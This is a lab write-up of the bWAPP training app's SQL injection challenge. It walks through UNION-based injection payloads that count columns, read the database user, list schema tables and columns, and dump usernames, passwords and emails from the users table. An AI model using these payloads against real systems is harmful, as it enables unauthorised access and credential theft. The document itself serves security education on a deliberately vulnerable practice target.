## First Page Contents:

First thing we see when we begin is a CAPTCHA that we have to pass before proceeding to the next page. So, as any CAPTCHA we have to write the same combination of characters and numbers in order to pass it. After doing just that, we are redirected to the next page.

## Second Page Content:

This page contains a search bar that we can use to search for a movie and a table in which the information of the searched movie will be displayed.

We can use the same steps we used to solve the bWAPP SQL Injection (GET-SEARCH)
challenge.

So, let us do just that.

First thing we need to know the number of columns in the table and those that we are able to see.

Using this line:

```MySQL
' order by 8-- -
```

We get an error which column 8 is an unkown column which means that we have 7 columns in this table.

Then we can use the following line:

```MySQL
iron’ union select 1,2,3,4,5,6,7– –
```

This gives the number of columns which we are able to see and those are the 2nd, 3rd, 5th and 4th columns.

Then we can use one of these columns to display in it the user of the database, by using this line:

```MySQL
iron' union select 1, user() , 3,4,5,6,7-- -
```

We can see that the user has the name of root@localhost.

Then we can use information_schema to know more about the database and its schema:

```MySQL
iron' union select 1,table_schema,table_name,4,5,6,7 from information_schema.tables-- -
```

This gives us a table with all the table names and the databases the database schemas they elong to.

We can see that the database which is called bWAPP has a table in it that is called users which by using common sense leads us to think that this table could have the usernames and hopefully the password of the users, so we can pursue that table.

We can use the following line to explore that table:

```MySQL
iron' union select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_schema = 'bWAPP' and table_name = 'users'-- -
```

This gives a table which has the name of all the columns in the users table.

Now we have all the information we need to know all the users' sensitive data and we can do just that by using the following line:

```MySQL
iron' union select 1,login,password,email,admin,6,7 from users-- -
```

This gives a table that has the username, password, email and admin of each user in the table.

Now, we have successfully managed to exploit the SQL Injection vulnerability in this webpage.
